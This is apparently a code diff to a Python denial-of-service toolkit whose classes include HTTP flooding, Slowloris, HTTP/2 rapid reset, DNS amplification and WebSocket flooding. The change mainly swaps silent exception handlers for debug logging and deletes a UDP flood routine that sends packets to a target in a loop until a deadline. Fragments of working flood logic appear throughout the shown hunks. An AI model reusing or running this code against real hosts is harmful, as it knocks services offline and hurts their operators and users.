@@ -10,6 +10,9 @@ from scapy.layers.dns import DNS, DNSQR
 from datetime import datetime, timedelta
 from scapy.all import IP, TCP, UDP, ICMP, send
 from .utilities import NetworkUtilities, Endpoint, _decode_str
+from .logger import getLogger
+
+logger = getLogger("Flood")
 
 
 class L7Async:
@@ -56,11 +59,11 @@ class L7Async:
                     await resp.read()
 
             except asyncio.TimeoutError:
-                pass
+                logger.debug("L7 request timeout")
             except aiohttp.ClientError:
-                pass
+                logger.debug("L7 client error")
             except Exception:
-                pass
+                logger.debug("L7 unexpected error")
 
             if (self.until - datetime.now()).total_seconds() <= 0:
                 break
@@ -105,18 +108,7 @@ class L4Async:
                 writer.close()
                 await writer.wait_closed()
             except Exception:
-                pass
-
-    async def _send_udp_async(self, message: bytes) -> None:
-        sock = asyncio.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            while (self.until - datetime.now()).total_seconds() > 0:
-                try:
-                    sock.sendto(message, (self.endpoint.host, self.endpoint.port))
-                except Exception:
-                    pass
-        finally:
-            sock.close()
+                logger.debug("L4 TCP send failed")
 
     def _run_async(self, coro) -> None:
         task = asyncio.create_task(coro)
@@ -186,14 +178,15 @@ class Slowloris:
                     )
                     await asyncio.get_event_loop().sock_sendall(sock, partial)
                 except Exception:
+                    logger.debug("Slowloris keep-alive failed")
                     break
         except Exception:
-            pass
+            logger.debug("Slowloris connection error")
         finally:
             try:
                 sock.close()
             except Exception:
-                pass
+                logger.debug("Slowloris socket close error")
 
     def _run_async(self, coro) -> None:
         task = asyncio.create_task(coro)
@@ -263,7 +256,7 @@ class H2RapidReset:
                 writer.close()
                 await writer.wait_closed()
             except Exception:
-                pass
+                logger.debug("H2 reset error")
 
     def _run_async(self, coro) -> None:
         task = asyncio.create_task(coro)
@@ -307,7 +300,7 @@ class DNSAmplification:
                 )
                 send(pkt, verbose=0)
             except Exception:
-                pass
+                logger.debug("DNS amp send failed")
 
     def _run_async(self, coro) -> None:
         task = asyncio.create_task(coro)
@@ -342,7 +335,7 @@ class WebSocketFlood:
                             await ws.send_str(msg)
                             await asyncio.sleep(0.1)
             except Exception:
-                pass
+                logger.debug("WS flood error")
 
     def _run_async(self, coro) -> None:
         task = asyncio.create_task(coro)
